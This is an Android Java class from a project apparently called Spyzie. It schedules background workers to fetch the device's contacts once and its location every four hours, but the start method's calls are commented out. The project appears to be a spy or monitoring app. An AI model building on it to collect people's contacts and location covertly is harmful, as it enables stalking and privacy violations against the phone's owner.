package com.tantd.spyzie.data.device;

import android.content.Context;
import android.util.Log;

import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;

import com.tantd.spyzie.data.device.worker.GetContactsWorker;
import com.tantd.spyzie.data.device.worker.GetLocationWorker;
import com.tantd.spyzie.di.ApplicationContext;
import com.tantd.spyzie.util.Constants;

import java.util.concurrent.TimeUnit;

import javax.inject.Inject;

/**
 * Created by tantd on 2/26/2020.
 */
public class AppDeviceDataManager implements DeviceDataManager {

    @Inject
    @ApplicationContext
    Context mContext;

    private static final String DEBUG_SUB_TAG = "[" + AppDeviceDataManager.class.getSimpleName() + "] ";

    private static final int UPDATE_PERIOD = 4;
    private static final String FETCH_CONTACTS = "FETCH_CONTACTS";

    private static AppDeviceDataManager sInstance;

    private OneTimeWorkRequest mOneTimeWorkRequest;
    private PeriodicWorkRequest mPeriodicWorkRequest;

    private boolean isRunning;

    public static synchronized AppDeviceDataManager getInstance() {
        if (sInstance == null) {
            sInstance = new AppDeviceDataManager();
        }
        return sInstance;
    }

    private AppDeviceDataManager() {
        mOneTimeWorkRequest = new OneTimeWorkRequest.Builder(GetContactsWorker.class).build();
        mPeriodicWorkRequest = new PeriodicWorkRequest.Builder(GetLocationWorker.class, UPDATE_PERIOD, TimeUnit.HOURS).build();
        isRunning = false;
    }

    @Override
    public void startFetchingDeviceData() {
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "startFetchingDeviceData, isRunning=" + isRunning);
        if (!isRunning) {
            if (Constants.IS_DEBUG_MODE) {
//                WorkManager.getInstance(mContext).enqueueUniqueWork(FETCH_CONTACTS, ExistingWorkPolicy.KEEP, mOneTimeWorkRequest);
//                Intent intent = new Intent(SpyzieApplication.getInstance(), SpyzieService.class);
//                SpyzieApplication.getInstance().startService(intent);
            } else {

            }
        }
    }
}
